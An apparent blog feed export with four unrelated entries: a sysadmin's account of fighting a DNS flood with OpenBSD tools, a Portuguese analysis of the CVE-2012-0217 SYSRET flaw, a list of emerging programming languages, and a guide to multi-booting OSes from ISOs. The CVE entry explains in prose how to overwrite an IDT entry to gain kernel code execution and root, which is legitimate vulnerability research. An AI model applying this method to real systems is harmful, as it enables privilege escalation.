equipment used and relied upon by old friends, so I set out to make things liveable again as soon as I was able. Read on for field notes on practical incident response.  Under Attack? Just Block Them Then! My early impulse was of course to adjust the PF rules that take care of rapid-fire brute force attacks (see eg the tutorial or the book for info) to swallow up the the rapid-fire DNS as well. That was unfortunately only partially successful. We only achieved small dips in the noise level.   Looking at the traffic via tcpdump(8) and OpenBSD's excellent systat states view revealed that the floods were incoming at a fairly quick pace and was consistently filling up the state table on each of the firewalls, so all timeouts were effectively zero for longish periods. A pfctl -k directed at known attackers would typically show a few thousand states killed, only to see the numbers rise quickly again to the max number of states limit.  Even selectively blocking by hand or rate-limiting via pf tricks was only partially effective.  The traffic graphs showed some improvement, but the tcpdump output didn't slow at all.  At this point it was getting fairly obvious that the requests were junk -- no sane application will request the same information several thousand times in the space of a few seconds.     It Takes People Skills. Plus whois. And A Back Channel. So on to the boring part. In most cases what does help, eventually, is contacting the people responsible for the security of the networks where the noise traffic originates. On Unixish systems, you have at your fingertips the whois(1) command, which is designed for that specific purpose.  Use it. Feeding a routeable IP adress to whois will in most circumstances turn up useful contact data.  In most cases, the address you're looking for is abuse@ or the security officer role for the network or domain.   If you're doing this research while you're the target of a DDOS, you will be thanking yourself for installing a back channel to somewhere that will give you enough connectivity to run whois and send email to the abuse@ addresses.  If your job description includes dealing with problems of this type and you don't have that in place already, drop what you're doing and start making arrangements to get a back channel, right now.   Next up, take some time to draft a readable message text you can reuse quickly to convey all relevant information to the persons handling abuse@ mail at the other end.    Be polite (I've found that starting with a "Dear Colleague" helps), to the point, offer relevant information up front and provide links to more (such as in my case tcpdump output) for followup.  Stress the urgency of the matter, but do not make threats of any kind, and save the expletives for some other time.  The issue here is to provide enough information to make the other party start working on the problem at their end and preferably inspire them to make that task a high priority one.  Do offer an easy point of contact, make sure you can actually read and respond to email at the address you're sending from, and if necessary include the phone number where you are most easily reachable.   When you have a useful template message, get ready to send however many carefully amended copies of that message to however many colleagues (aka abuse@) it takes. Take care to cut and paste correctly, if there's a mismatch between your subject and your message body on anything essential or inconsistencies within your message, more likely than not your message will be discarded as a probable prank. Put any address you think relevant in your Cc: field, but do not hold out any high hopes off useful response from law enforcement. Only directly affected parties will display any interest whatsoever.   Fill in any blanks or template fields with the output from your monitoring tools. But remember, your main assets at this point are your people skills. If the volume is too high or you find the people part difficult, now is the time to enlist somebody to handle communications while you deal with the technical and analysis parts.   You will of course find that there are abuse contact addresses that are in fact black holes (despite the RFC stating basic requirements), and unless you are a name they've heard about you should expect law enforcement to be totally useless. But some useful information may turn up.   Good Tools Help, Beware Of Snake Oil I've already mentioned monitoring tools, for collecting and analyzing your traffic.  There is no question you need to have useful tools in place. What I have ended up doing is to collect NetFlow traffic metadata via OpenBSD's pflow(4) and similar means and monitoring the via  NFSen. Other tools exist, and if you're interested in network traffic monitoring in general and NetFlow tools in particular, you could do worse than pick up a copy of Michael W. Lucas' recent book Network Flow Analysis.  Michael chose to work with the flow-tools family of utilities, but he does an outstanding job of explaining the subject in both theory and in the context of practical applications.  What you read in Michael's book can easily be transferred to other toolsets once you get at grip on the matter.   Unfortunately, (as you will see from the replies you get to your messages) if you do take an interest in your network traffic and start measuring, you will be one of a very select minority.  One rather perverse side effect of 'anti-terror' or 'anti-anythingyouhate' legislation such as the European Union Data Retention Directive and similar log data retention legislation in the works elsewhere is that logging anything not directly associated with the health of your own equipment is likely to become legally burdensome and potentially expensive, so operators will only start logging with a granularity that would be useful in our context once there are clear indications that an incident is underway.  Combine this with the general naive optimism people tend to exhibit (aka 'it won't happen here'), and result is that very few system operators actually have a clue about their network traffic.   Those who do measure their traffic and respond to your queries may turn up useful information - one correspondent was adamant that the outgoing traffic graph for the IP adress I had quoted to them was flat and claimed that what I was likely seeing was my servers being utilized in a DNS amplification attach (very well described by Cloudflare in this blog post). The main takeway here is that since UDP is basically 'fire and forget', unless your application takes special care, it is possible to spoof the source address and target the return traffic at someone else.     My minor quarrel with the theory was that the vast majority of requests were not recursive queries (a rough count based on grep -c on tcpdump output preserved here says that "ANY" queries for domains we did legitimately answer for at the start of the incident outnumbered recursive queries by a ratio better than 10,000 to 1).  So DNS amplification may have been a part of the problem, but a rather small one (but do read the Cloudflare article anyway, it contains quite a bit of useful information).  And to make a long story slightly shorter, the most effective means of fighting the attack proved also to be almost alarmingly simple. First off, I moved the authority for the noise generating domains off elsewhere (the domains were essentially dormant anyway, reserved on behalf of a friend of mine some years ago for plans that somehow failed to move forward). That did not have the expected effect: the queries for those domains kept coming beyond the zone files' stated timeouts, aimed at the very same IP adresses as before. The only difference was that those queries were now met with a 'denied' response, as were (after I had found the config error on one host and fixed it) any recursive queries originating from the outside.     The fact that the noisemakers kept coming anyway lead me to a rather obvious conclusion: Any IP address that generates a 'denied' response from our name server is up to no good, and can legitimately be blackhole routed at the Internet-facing interface.  Implementing the solution was (no surprise) a matter of cooking up some scriptery, including one that tails the relevant logs closely, greps out the relevant information and one that issues a simple route add -host $offendingip 127.0.0.1 -blackhole for each offending IP address.  My users reported vastly improved network conditions almost immediately, while the number of blackhole routed IP addresses at each site quickly shot up to a 24-hour average in somewhere in the low thousands before dropping rather sharply to at first a few hundreds, through a few dozen to, at last count, a total of 5.    There are a number of similar war stories out there, and good number of them end up with a recommendation to buy 'DDOS protection' from some vendor or other (more often than not some proprietary solution where you get no clue about the innards), or to 'provision your stuff to infrastructure that's too big to be DDOSed'. Of these options I would prefer the latter, but this story I think shows that correct use of the tools OpenBSD and other sane operating systems provide for free will go a long way. More kit helps if you're lucky, but smarts win the day.   Should we publish, or 'name and shame'? I strongly suspect that most of the handful of boxes that are currently blackhole routed by my setup here belong to a specific class of 'security consultant' who for reasons of their own want a piece of the sniffing for recursive resolvers action. But I really can't be certain: I have now way except whois and guesswork to determine who mans the scanning boxes and for what purpose(will they alert owners of any flaws found or save it all for their next attack -- there just is no way to tell). Scans like those (typically involving a query for './A/IN' or the texbook 'isc.org/ANY/IN') are are of course annoying, but whoever operates those boxes are very welcome to contact me in any way they can with data on their legitimate purposes.  During the attack I briefly published a list of the IP addresses that had been active during the last 24 hours to the bsdly.net web site, and for a short while I even included them as a separate section in the bsdly.net blacklist for good measure (an ethically questionable move, since that list is generated for a different and quite specific purpose). I am toying with the idea of publishing the current list of blackholed hosts in some way, possibly dumping to somewhere web-accessible every hour or so, if feedback on this column indicates it would be a useful measure. Please let me know what you think in comments or via email.  For the rest of you out there, please make an effort to keep your systems in trim, well configured with no services running other than for the specific purposes you picked.  Keeping your boxes under your own control does take an effort, but it's worth your trouble.  Of course there are entire operating environments worth avoiding, and if you're curious about whether any system in your network was somehow involved in the incident, I will answer reasonable requests for specific digging around my data (netflow and other).  As a side note, the story I had originally planned to use as an illustration of how useful netflow data is in monitoring and capacity planning involves a case of astoundingly inane use of a Microsoft product in a high dollar density environment, but I'll let that one lie for now.   Good night and good luck.]]></summary>

  <title><![CDATA[Uma análise do CVE-2012-0217]]></title>
  <summary><![CDATA[Introdução Em junho desse ano o time de segurança do sistema operacional FreeBSD publicou um alerta desegurança sobre uma vulnerabilidade descoberta por Rafal Wojtczuk que afeta todas as versões 64 bits.Essa  vulnerabilidade  não  só  afeta  o  sistema  operacional  FreeBSD  mas  também  vários  sistemasoperacionais  e sistemas de virtualização[1] disponíveis, com exceção do OpenBSD 5.0 e o Linux quejá tinha corrigido a vulnerabilidade desde 2006[3]. Nesse post será explicado a natureza da vulnerabilidade e como ela pode ser utilizada para obterexecução de códigos no kernel. Apesar de já existir exploits públicos para Windows [4] e para FreeBSD[5] [6], um exploit para FreeBSD também será apresentado nesse artigo. Assume-se que o leitor saiba  como funciona exploração  de vulnerabilidades  em  kernel, sistemasoperacionais e suas estruturas, principalmente IDT[7] e como realizar debugging do kernel. Os  experimentos  realizados  nesse  artigo  foram  realizados  utilizando  a  versão  9.0  RELEASE  doFreeBSD. A vulnerabilidade Esse artigo tem como foco o padrão 64 bits desenvolvido pela AMD, chamada de AMD64[8] ou x86-64 que também é utilizado pela Intel. A CPU tem vários modos de operação, sendo os dois principais: o modo mais privilegiado que é omodo em que o kernel é executado e chamado de ring0 e o menos privilegiado, chamado de ring3, omodo em que os programas comum do dia a dia são executados como browsers e editores de texto.Quando uma aplicação que está sendo executada em ring3 precisa realizar uma operação privilegiada,um conjunto de operações precisam ser realizadas para mudar o modo de operação para o modo maisprivilegiado. O padrão AMD64 adicionou um novo conjunto de instruções para realizar a troca de contexto, chamada de fastsyscall[10] e é basicamente composto por duas instruções: 'SYSCALL' e 'SYSRET'. A instrução 'SYSCALL' é utilizada para passar do modo menos privilegiado para o mais privilegiado (ring3→ ring0), invocar o kernel, e a instrução 'SYSRET' o processo inverso, do mais privilegiado para o menos privilegiado, retornando para modo usuário. A vulnerabilidade existe devido a um erro na implementação da instrução 'SYSRET' nos processadoresAMD64 da Intel que é utilizada na troca de contexto (ring0 → ring3) em sistemas 64 bits, por isso essavulnerabilidade só afeta sistemas 64 bits que estejam utilizando processadores da Intel. A AMD também adicionou um novo tipo de endereçamento chamado de endereço canônico[11]. Essetipo de endereçamento exige que os bit 47 ao 63 sejam iguais para serem utilizados como endereço dememória, não satisfazendo essa igualdade, o endereço é considerado inválido. É utilizado a faixa deendereço  0x0000000000000000 até 0x00007fffffffffff e 0xffff800000000000  até 0xffffffffffffffff, qualquer endereço de memória fora desses dois limites é um endereço não canônico. Quando algum tipo de acesso a um endereço de memória não canônico for realizado, uma exceção égerada  e  tratada  pelo  sistema  operacional.  A  diferença  no  processador  da  Intel  que  gerou  avulnerabilidade é que, em determinada situação, o sistema operacional irá tratar essa exceção no modomais privilegiado da CPU diferente do processador da AMD que irá tratar no modo menos privilegiado. A criticidade dessa sútil diferença entres os processadores é que no momento que o gerenciador deexceção for executado, o sistema operacional já restaurou os valores dos registradores para valorescontroláveis pelo usuário, entre esses registradores o mais interessante do ponto de vista de um atacanteé a pilha, registrador %rsp na arquitetura AMD64. Portanto, quando a instrução 'SYSRET' for encontrada e executada a CPU deverá realizar basicamenteas seguintes ações: 1 → Mudar o modo de operação da CPU do mais privilegiado para o menos privilegiado;2 →Redirecionar o fluxo de execução de instrução para o endereço armazenado no registrador%rcx; O que ocorre com o processador da Intel é o processo inverso, o passo 2 é executado antes do passo 1. A forma utilizada para acionar essa vulnerabilidade foi alterar o valor do registrador  %rcx para umendereço não canônico e após isso executar a instrução 'SYSRET'. É permitido armazenar valores não canônico no registrador %rcx por ele ser um registrador de propósito geral. Apesar de não ser o único, o método utilizado por alguns expoits públicos para FreeBSD consiste emmapear a última página de memória canônica disponível ao usuário, e colocar a instrução 'SYSCALL'nos últimos bytes alocados. Assim, após a execução da instrução e a passagem do controle para okernel, ao executar a instrução 'SYSRET', o registrador %rcx terá o valor não canônico. Como pode servisto na imagem abaixo. Clique na imagem para uma melhor visualização.  Figura 1: Acionando a vulnerabilidade  Em discussão com Joilson Rabelo[12] e depois confirmado através do blog-post feito pela VUPEN[13], no Windows 7 esse método não funciona, pois o  kernel do Windows não permite mapear a última página de memória disponível para o usuário. Houve  modificações  no  manual  da  Intel  endereçando  o  problema.  Abaixo  trecho  retirado  domanual[14] que especifica que o sistema operacional precisa realizar validações para evitar que esseproblema  ocorra,  modificação  realizada  em  Agosto  de  2012,  dois  meses  após  a  publicação  davulnerabilidade.  The SYSRET instruction does not modify the stack pointer (ESP or RSP). For that reason, it is necessary for software to switch to the user stack. The OS may load the user stack pointer (if it was saved after SYSCALL) before executing SYSRET; alternatively, user code may load the stack pointer (if it was saved before SYSCALL) after receiving control from SYSRET. If the OS loads the stack pointer before executing SYSRET, it must ensure that the handler of any interrupt  or  exception  delivered  between  restoring  the  stack  pointer  and  successful  execution  of SYSRET is not invoked with the user stack. It can do so using approaches such as the following: • External interrupts. The OS can prevent an external interrupt from being delivered by clearing EFLAGS.IF before loading the user stack pointer. • Nonmaskable interrupts (NMIs). The OS can ensure that the NMI handler is invoked with the correct stack by  using the interrupt stack table (IST) mechanism for gate 2 (NMI) in the IDT (see Section 6.14.5,“Interrupt Stack Table,” in Intel® 64 and IA-32 Architectures Software Developer’s Manual, Volume 3A). • General-protection exceptions (#GP). The SYSRET instruction generates #GP(0) if the value of RCX is not canonical. The OS can address this possibility using one or more of the following approaches: — Confirming that the value of RCX is canonical before executing SYSRET. — Using paging to ensure that the SYSCALL instruction will never save a non-canonical value into RCX. — Using the IST mechanism for gate 13 (#GP) in the IDT.   Executando códigos arbitrários no kernel Como, apartir das informações que temos até agora, é possível executar códigos arbritários? Ao acionara vulnerabilidade o gerenciador de exceção nos processadores Intel 64 bits será executado em ring0.Precisamos fazer com que a exceção seja executada, fazendo com que o processador tente acessaralguma região de memória numa área não canônica como descrito anteriormente. Durante a execuçãodo gerenciador de exceção valores  são escritos  no endereço que está no registrador  %rsp que écontrolado pelo usuário (e daí que a vulnerabilidade pode ser explorada). Podemos alterar o registrador%rsp para apontar para alguma estrutura do kernel que, durante a execução do gerenciador de exceçãoserá sobrescrita com valores controlados pelo usuário.  Como pode ser visto na imagem a baixo. Clique na imagem para uma melhor visualização.  Figura 2: Sobrescrevendo entrada na IDT  Então o que foi feito para obter execução de códigos é colocar o endereço de determinada entrada daIDT no registrador %rsp e alterar o valor do registrador %rdx para um valor que, ao sobrescrever osvalores originais, modificará os campos gd_hioffset e gd_looffset da entrada 14 da IDT que é a entradareferente ao Page Fault Exception(#PF) para o endereço de uma função que será responsável porescalar os privilégios do usuário atual, reparar todo o estrago feito da IDT e retornar para modo usuáriocom sucesso. Como os campos responsáveis por armazenar o endereço da função original que seráexecutada foi sobrescrito pelo endereço da função  kernel_code (0x400b50), nosso código pode serexecutado a qualquer momento que uma exceção do tipo #PF for acionada. Devido a forma que foiutilizada para acionar a vulnerabilidade, um exceção #PF é gerada automaticamente durante a execuçãodo gerenciador de exceção original devido a alguns registradores estar com seus valores incoerentes. Como  mencionado  acima,  após  ganharmos  execução  de  código  precisamos  restaurar  os  valoresoriginais da IDT que foram corrompidos para evitar um  crash e reiniciar o sistema e depois dissoelevar o privilégio do usuário atual para root. Para podermos fazer isso precisamos saber o endereço daestrutura que armazena as informações do usuário, há várias formas de conseguir isso, a que foi utilizada no  exploit é mencionada nesse artigo em [15]. A vantagem de utilizar esse método é quepodemos obter o endereço da estrutura antes mesmo de acionar a vulnerabilidade, diferente do métodoutilizado nos exploits públicos que obtem esse endereço após ganhar execução de código no kernel. Oúltimo passo que o exploit deve fazer é retornar para modo usuário após de ter feito tudo que queríamosno kernel, isso é feito colocando no registrador %rcx o endereço de uma função do exploit que checaráse realmente os privilégios  foram elevados e finalizar o processo, no  exploit é a função  done  a responsável por isso. Conclusão Particularmente, essa foi umas das vulnerabilidades mais interessantes do ano, inclusive foi nomeadapara o prêmio Pwnie Awards[16] na categoria de melhor vulnerabilidade que permite escalação deprivilégios, infelizmente não ganhou. O motivo que mais chamou a atenção nessa vulnerabilidade, alémda sua complexidade, é o fato dela existir há muito tempo, como mencionado na introdução que noLinux foi corrigida desde 2006. Aqui[17] há uma discussão em húngaro bastante interessante com detalhes da vulnerabilidade e outra forma de como a exploração pode ser feita. Código disponível aqui.

  <title><![CDATA[programming languages that could change IT]]></title>
  <summary><![CDATA[These cutting-edge programming languages provide unique insights on the future of software development
so we showing  promising 10 languages that make impact on out computer science field and IT field .So question appears why we need another programming language if we have so may programming language around us (like C,C++,JAVA,C#,perl,ruby etc..)? 
WELL solution is There is certainly no shortage of choices already. Between imperative languages, functional languages, object-oriented languages, dynamic languages, compiled languages, interpreted languages, and scripting languages, no developer could ever learn all of the options available today. 
if we take past one decade new technologies  arrived that made heavy impact on IT like cloud computing is one of the technology  ,mobile computing  ,The rise of multi core CPUs ,distributed architectures have created new challenges for developers. Adding support for the latest features, paradigms, and patterns to existing languages especially popular ones can be prohibitively difficult . Sometimes the best answer is to start from scratch AND   arrival of smartphones,tablets that made us to think our existence programming language. 
AGAIN WE are not provoking  that existence languages are not good so we rethinking of newer languages certainly not like that still we believe that mother of all language is C .Simply if i can put statement that if we don’t know C then it’s difficult to understand any programming language still they existence languages are great doing.  but simple manner i can call we updating our new languages just providing new names new protocols and brand new paradigms. 
SO LET US see next top 10 new programming languages  (Experimental programming languages) 
1.Dart:   (originally, Dash) is an open source Web programming language developed by Google. It was unveiled at the GOTO conference in Aarhus, 2011Dart is intended to solve JavaScript‘s problems (which, according to a leaked memo, cannot be solved by evolving the language) while offering better performance, the ability “to be more easily tooled for large-scale projects” and better security features.Like JavaScript. 
Dart uses C-like syntax and keywords. One significant difference, however, is that while JavaScript is a prototype-based language, objects in Dart are defined using classes and interfaces, as in C++ or Java. Dart also allows programmers to optionally declare variables with static types. The idea is that Dart should be as familiar, dynamic, and fluid as JavaScript, yet allow developers to write code that is faster, easier to maintain, and less susceptible to subtle bugs.

http://www.dartlang.org/ 
2. Go: is a compiled, garbage-collected, concurrent programming language developed by Google Inc. The initial design of Go was started in September 2007 by Robert Griesemer, Rob Pike, and Ken Thompson. Go was officially announced in November 2009. In May 2010, Rob Pike publicly stated that Go was being used “for real stuff” at Google. Go’s “gc” compiler targets the Linux, Mac OS X, FreeBSD, OpenBSD, Plan 9, andMicrosoft Windows operating systems and the i386, amd64, and ARM processor architectures. 
Go is meant to be easy to program in. Its basic syntax is C-like, but it eliminates redundant syntax and boilerplate while streamlining operations such as object definition. The Go team’s goal was to create a language that’s as pleasant to code in as a dynamic scripting language yet offers the power of a compiled language.

3.Ceylon:The Ceylon Project is an upcoming programming language and SDK, created by Red Hat. It is based on the Java programming language and when it is released, will run under the Java Virtual Machine. The project is described to be what a language and SDK for business computing would look like if it were designed today, keeping in mind the successes and failures of the Java language and Java SE SDK. The project has been referred to by industry analysts as a “Java killer”, though Red Hat themselves reject this term. 
Among King’s gripes are Java’s verbose syntax, its lack of first-class and higher-order functions, and its poor support for meta-programming. In particular, he’s frustrated with the absence of a declarative syntax for structured data definition, which he says leaves Java “joined at the hip to XML.” Ceylon aims to solve all these problems.

4. F#: (pronounced F Sharp) is an open-source, strongly typed, multi-paradigm programming languageencompassing functional, imperative and object-oriented programming techniques. F# is most often used as a cross-platform CLI language, but can also be used to generate JavaScript[ and GPU code.F# is developed by The F# Software Foundationand Microsoft . An open source, cross-platform edition of F# is available from the F# Software Foundation. F# is also a fully supported language in Visual Studio. Other tools supporting F# development include Mono, MonoDevelop, SharpDevelop and the WebSharper tools for JavaScriptand HTML5 web programming.Influenced by OCaml, C#, Python, Haskell,Scala and Erlang. 
 F# now ships with Visual Studio 2010. Better still, in an unusual move, Microsoft has made the F# compiler and core library available under the Apache open source license you can start working with it for free and even use it on Mac and Linux systems (via the Mono run time).

5. Fantom: is a general purpose object-oriented programming language created by Brian and Andy Frank that runs on the Java Runtime Environment (JRE), JavaScript, and the .NET Common Language Runtime (CLR) (.NET support is considered “prototype” status). Its primary design goal is to provide a standard library API that abstracts away the question of whether the code will ultimately run on the JRE or CLR. Like C# and Java, Fantom uses a curly brace syntax. The language supports functional programming through closures and concurrency through the Actor model. Fantom takes a “middle of the road” approach to its type system, blending together aspects of both static and dynamic typing. 
But portability is not Fantom’s sole raison d’être. While it remains inherently C-like, it is also meant to improve on the languages that inspired it. It tries to strike a middle ground in some of the more contentious syntax debates, such as strong versus dynamic typing, or interfaces versus classes. It adds easy syntax for declaring data structures and serializing objects. And it includes support for functional programming and concurrency built into the language.

http://fantom.org/ 
6. Opa: is an open source programming language for developing scalable web applications.It can be used for both client-side and server-side scripting, where complete programs are written in Opa and subsequently compiled to native code on the server and JavaScript on the client, with the compiler automating all communication between the two. Opa implements strong, static typing, which can be helpful in protecting against security issues such as SQL injections and cross-site scripting attacks.The language was first officially presented at the OWASP conference in 2010, and the source code was released on GitHub in June 2011, under a GNU Affero General Public License. Later, the license changed to the MIT license for the framework part (library) and AGPL for the compiler so that applications written in Opa can be released under any license, proprietary or open source. 
Opa accomplishes this through a combination of client- and server-side frameworks. The Opa compiler decides whether a given routine should run on the client, server, or both, and it outputs code accordingly. For client-side routines, it translates Opa into the appropriate JavaScript code, including AJAX calls.

7.haXe: is an open-source high-level multiplatform programming language and compiler that can produce applications and source code for many different platforms from a single code-base. Code written in the Haxe language can be compiled into Adobe Flash applications, JavaScript programs, and to some extent C++standalone applications, PHP, Apache CGI and NodeJS server-side applications. 
Haxe includes a set of common functionality that is supported across all platforms, such as numeric data types,text, arrays, binary and some common file formats. Haxe also includes platform-specific API, but as of 2012, it only supports a subset of the functionality available in each platform, with only the Flash platform API fully usable. Haxe can also compile to Neko code, which runs in the Neko runtime created by the same developer.Haxe was developed by Nicolas Cannasse and other contributors, and was named Haxe because it was short, simple, and “has an X inside”, which the author humorously asserts is necessary to make any new technology a success. Haxe is pronounced “hex” (/heks/), although the authors of the only published book on the language pronounce it “hacks”. 
Although still under development, haXe is used commercially by its creator, the gaming studio Motion Twin, so it’s no toy. It’s available for Linux, Mac OS X, and Windows under a combination of open source licenses. 
for more information see following links  : 
http://haxe.org/ 
8.Zimbu: Zimbu is an experimental programming language designed by Bram Moolenaar, the writer of vim. It was released in November 2009.Most programming languages borrow features and syntax from an earlier language. Zimbu takes bits and pieces from almost all of them. The brainchild of Bram Moolenaar, creator of the Vim text editor, Zimbu aims to be a fast, concise, portable, and easy-to-read language that can be used to code anything from a GUI application to an OS kernel. 
Unfortunately, the Zimbu project is in its infancy. The compiler can build itself and some example programs, but not all valid Zimbu code will compile and run properly. Not all proposed features are implemented yet, and some are implemented in clumsy ways. if you would like to experiment, preliminary tools are available under the Apache license.

9. X10: is a programming language being developed by IBM at the Thomas J. Watson Research Center as part of the Productive, Easy-to-use, Reliable Computing System (PERCS) project funded by DARPA‘s High Productivity Computing Systems (HPCS) program. Its primary authors are Kemal Ebcioğlu, Vijay Saraswat, and Vivek Sarkar.X10 is designed specifically for parallel programming using the partitioned global address space (PGAS) model. A computation is divided among a set of places, each of which holds some data and hosts one or more activitiesthat operate on those data.it”s follows  object oriented programming . 
For now, the language is evolving, yet fairly mature. The compiler and runtime are available for various platforms, including Linux, Mac OS X, and Windows. Additional tools include an Eclipse-based IDE and a debugger, all distributed under the Eclipse Public License.

10.Chapel: the Cascade High Productivity Language, is a parallel programming language developed by Cray.It is being developed as part of the Cray Cascade project, a participant in DARPA‘s High Productivity Computing Systems (HPCS) program, which had the goal of increasing supercomputer productivity by the year 2010. Chapel aims to improve the programmability of parallel computers in general and the Cascade system in particular, by providing a higher level of expression than current programming languages do and by improving the separation between algorithmic expression and data structure implementation details. 
 
Chapel supports a multithreaded parallel programming model at a high level by supporting abstractions for data parallelism, task parallelism, and nested parallelism.Chapel’s syntax draws from numerous sources. In addition to the usual suspects (C, C++, Java), it borrows concepts from scientific programming languages such as Fortran and Matlab. Its parallel-processing features are influenced by ZPL and High-Performance Fortran, as well as earlier Cray projects. 
Work on Chapel is ongoing. At present, it can run on Cray supercomputers and various high-performance clusters, but it’s portable to most Unix-style systems (including Mac OS X and Windows).  source code is available under a BSD-style open source license.

  <title><![CDATA[Install multiple OS Without Cds]]></title>
  <summary><![CDATA[AskApache.com  Orig published 2006.  If you are looking for a current solution I would recommend: Pendrivelinux.com, Ultra Boot CD, Linux Live USB Creator, or my personal favorite UNetbootin  

I had a CD-RW drive but being a computer security researcher I had no desire to spend money for blank cd-recordables.  What follows is how I managed to install various operating systems on my computer (1 hard drive) without having to burn to a CD the ISO and then boot from that. 

The original reason I wrote this article was just to expand my knowledge of network/computer security on unix/BSD/linux operating systems. The plan was to create a multi-OS pc that I could boot into 1 of several OS's, then from another PC I would attempt to hack into the computer.. mostly just scanning to get baselines and get a feel for the differences.   I figured the best way to do that would be to have a multi-boot system. Unfortunately for me I didn't have any blank CDs to record ISO's on, and I also didn't have a floppy 3.5 disk. So that is how my journey into this subject-matter started. 

Summary

	Download the iso file
	Mount the iso file as a loop back device on a temporary directory /mnt/cdrom
	Save the content of /mnt/cdrom, which has the distro expanded in a recognisible form, into a temporary directory. (using dd to "burn" the iso to HD instead of CD)
	Reboot and use Grub, sourced from any other Linux, to boot up the kernal and initrd files of this temporary directory, thereby activate its installer if it has one or to conduct the installation from the fire-up GUI.

NOTE: Please keep in mind that there are many different ways to achieve this same result using various loop and ramdisk methods... this is ongoing for me so any help would be appreciated! 


Download the iso file
I have been into the computer security scene since 1990, but I realized that I had very little experience with the various LInux, Unix, and alternative Operating systems out there.  I first partitioned my 120GB harddrive into 10 partitions, the 2nd partition is a small swap and the last partition is extra large because it holds all the ISO images..  I then wrote a small shell script to automatically download (I love wget, but curl most!)  the following. 

    OpenBSD
    IpCOP
    Libranet
    Arch-Linux
    Fire
    Local Area Security
    Packet Master
    Devil-Linux
    FreeBSD
    Knoppix
    Helix
    Gentoo
    Yoper-Linux
    NetBSD
    RedHat
    Slackware

The script also downloaded Installation manuals and md5 checksums.. (let me know if I should post... its pretty unsophisticated ;) 
I installed Slackware (personal favorite) on hda1 using my last blank CD-R, note that I do not have a separate boot partion.  (Should I?).  I also installed grub on the MBR.  I love grub, if you read through the man pages and all info you can find about grub, you can learn a whole lot.  Grub has much more features and capability than lilo, even though lilo comes installed by default with slack. 
I organize my kernel situation as follows...  In my /boot directory, I mkdir KERNEL, CONFIG, MAP, INITRD and that is a good way for me to keep my kernels and everything organized..  Another good way is a separate dir for each new kernel. 

Since Arch-Linux is a solid distro, my personal favorite, I'll use that as a first example. 
Here is the Arch-Linux section of my shell script 

goge Arch-Linux
$w http://puzzle.dl.sourceforge.net/sourceforge/archlinux/arch-0.6.iso
$w http://unc.dl.sourceforge.net/sourceforge/archlinux/arch-0.6.md5sum
$w http://www.archlinux.org/docs/en/guide/install/arch-install-guide.html
md55
cat arch-0.6.md5sum
md5sum arch-0.6.iso
md55


Mount the iso file
The first thing to do is to mount the downloaded ISO image so we can use it as if it were an actual CD. 
mount -t iso9660 -o ro,loop=/dev/loop0 cdimage /mnt/cdrom
Where cdimage= the ISO image.   EX: /usr/local/src/ISO/Linux/Arch-Linux/arch-0.6.iso 
This mounts the iso as /mnt/cdrom. 

Next you need to copy /mnt/cdrom to a separate partition for the booting process.  So mkfs.ext2 /dev/hda9. ( I prefer reiserfs or even XFS to ext but if you use something other than ext2 you could run into some problems because some of the installation kernels and initrds don't include support for reiserfs and so can't recognize the files.  Although you could use mkinitrd to create a new initrd with reiserfs support, that might be pushin it IMO... ;) I use the 9th partition consistently for this.  I know there is a "right" way to copy the /mnt/cdrom files so everything stays the way it is supposed too, using tar or cpio, but I'm lazy so I just do cp -rp. 

(What is the tar or cpio commands to copy with correct permissions etc??)
So you mount the 9th partition as whatever, say /mnt/hd and then copy the files.  Now what? 

Reboot and use Grub
Now edit your /boot/grub/menu.lst file to include the specific options to boot arch-linux installation. 

A good idea is to find the isolinux.cfg file somewhere on the distro cd, this will tell you what to include in the menu.lst. Here is the section in my menu.lst 

title Arch Install
  root (hd0,8)
  kernel /isolinux/vmlinuz load_ramdisk=1 prompt_ramdisk=0 root=/dev/rd/0
  initrd=/isolinux/initrd.img

This should be self-explanatory.  The root (hd0,8) is pointing to partition 9.  So the rest of the commands start from partition 9. 
When you experience problems, remember you can always edit the grub boot options by typing 'e' and then edit the section.  Also, a good idea is to include several variations in your menu.lst so you can easily try other ways to boot efficiently.  And, remember to read up on all the installation guides that come with your distro, specifically, hard-disk installs. 
There are special cases, Gentoo, has a semi-new compressed filesystem called squashfs.  BTW, this is AWESOME, so check it out.  It has to be compiled into the kernel, so some work is in order, but use this recompile to optimize your kernel.  You can get the squashfs patch for almost any kernel.  I use the latest stable 2.6 kernel.  Squashfs is incredible and although I don't think you need it to install from ISO, you do need it to expand the livecd.squashfs filesystem that comes with the cd. Heres a sample Gentoo section from my menu.lst 

title Gentoo Install
  root (hd0,8)
  kernel /isolinux/gentoo root=/dev/ram0
  initrd=/isolinux/gentoo.igz init=/linuxrc acpi=off looptype=squashfs loop=/livecd.squashfs cdroot vga=791 splash=silent

A nother' tip is the shell that is provided if you experience problems, typically busybox or ash.  The key tools to get you going from here is mount and chroot.  Sometimes you will need to manually create a simulated file system and then chroot into it.  For instance, you might have to create boot, etc, bin, directories on the target partition. 
I generally install each OS onto the next partition (careful of the logical partition) and add it to my menu.lst after install.  A good idea is after installation, copy the kernel and initrd(if there is one) to the slackware(or whatever) boot partition on hda1.  I copy kernels to /boot/KERNEL/ and initrd's to /boot/INITRD, then menu.lst is more organized... 
You then need to add an updated section to your menu.lst (just comment out the install section for later) Here is the finished arch-linux section from menu.lst 

title Arch Linux 6
  root (hd0,2)
  kernel /boot/vmlinuz26 ro root=/dev/hdc3

This doesn't use my convenient boot/KERNEL/vmlinuz26 as you can tell by setting the root to partition 3. ***NOTE: Make a backup of MBR using dd and save to floppy, also backup the partition table to floppy, using cfdisk or parted.  And boot disks (I use 1 with grub, and 1 with slack, and tomsbootdisk) will invariably come in handy.  Tomsbootdisk is recommended, and make the grub boot disk when you install grub.  install to floppy. 

The final result after some fun experimenting, is when I boot, I have a cool grub boot screen come up with the option to boot into whatever OS I want, this is handy for multiple reasons.  One good thing to do after this is to port scan and vuln scan each OS, after you update of course.  Write this stuff down and you will know the weaknesses/strengths of the various OS's. 
I can boot a custom Firewall, snort, or multiple honeypots using this procedure, as well as a graphical kde environment with a kernel optimized for graphics and my processor/architecture, or an environment devoted to forensics or even an environment suitable for programming. 

P.S. Some of the cooler alternative operating systems are BeOS 5, EOS, ER_OS, V2_OS, and my personal favorite Menuet.  Menuet is 100% assembly graphical operating system that fits on a floppy.  Its money! 



This should be a good enough example to get you started, this kind of thing should be learned and not just copied... Knowing how to do this stuff could prove to be exceptionally useful... ;) 

I'm currently doing research into the following areas. 


MBR code, especially passing off control to different addresses.
The difference (in code) of the various bootloaders out there... I have around 20 so far.
